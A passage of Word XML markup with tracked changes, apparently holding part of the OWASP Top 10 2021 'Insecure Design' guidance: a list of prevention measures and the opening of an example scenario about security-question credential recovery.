      <w:moveToRangeStart w:id="1592" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923170"/>
    </w:p>
    <w:p w14:paraId="584B307E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1593" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="1594" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="1592"/>
      <w:ins w:id="1595" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">to Prevent </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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 ".how to prevent", id=id ~ "-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>how_to_prevent</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", name=title ~ ": How to Prevent", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57902698" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1596" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50256EC2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1597" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1598" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Establish and use a secure development lifecycle with AppSec</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4716E4A3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1599" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1600" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    professionals to help evaluate and design security and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="544E2B16" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1601" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1602" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    privacy-related controls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55D7DE15" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1603" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="556FA578" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1604" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1605" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Establish and use a library of secure design patterns or paved road</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="372BBE44" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1606" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1607" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    ready to use components</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="242F1018" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1608" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C8936F2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1609" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1610" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Use threat modeling for critical authentication, access control,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="770DADAA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1611" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1612" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    business logic, and key flows</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="62CC4519" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1613" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5183B11D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1614" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1615" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Integrate security language and controls into user stories</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="442E87FE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1616" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4823E8AD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1617" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1618" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Integrate plausibility checks at each tier of your application</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24A200AD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1619" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1620" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    (</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> frontend to backend)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7600BFCA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1621" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CAAB83" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1622" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1623" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   Write unit and integration tests to validate that all critical flows </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B226F46" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1624" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1625" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    are resistant to the threat model. Compile use-cases *and* misuse-cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13138A21" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1626" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1627" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    for each tier of your application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6FA6C237" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1628" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B75BAF4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1629" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1630" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Segregate tier layers on the system and network layers depending on the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1E920FF7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1631" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1632" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    exposure and protection </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>needs</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="647B2ACE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1633" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="642603E4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1634" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1635" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Segregate tenants robustly by design throughout all tiers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2170209D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1636" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="659FF841" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1637" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1638" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Limit resource consumption by user or service</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4503D1EB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1639" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="1640" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923171"/>
    </w:p>
    <w:p w14:paraId="3E990B53" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1641" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="1642" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Example Attack Scenarios</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="105438A9" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00AC649A" w:rsidRDefault="00B74248" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1643" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:moveToRangeEnd w:id="1640"/>
    <w:p w14:paraId="0A0E6624" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1644" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1645" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>1:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* A credential recovery workflow might include “questions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65713623" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1646" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1647" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>and answers,” which is prohibited by NIST 800-63b, the OWASP ASVS, and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4336CC5C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1648" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1649" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>the OWASP Top 10. Questions and answers cannot be trusted as evidence of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="284AB1A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1650" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1651" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>identity as more than one person can know the answers, which is why they</w:t>
        </w:r>
      </w:ins>
    </w:p>
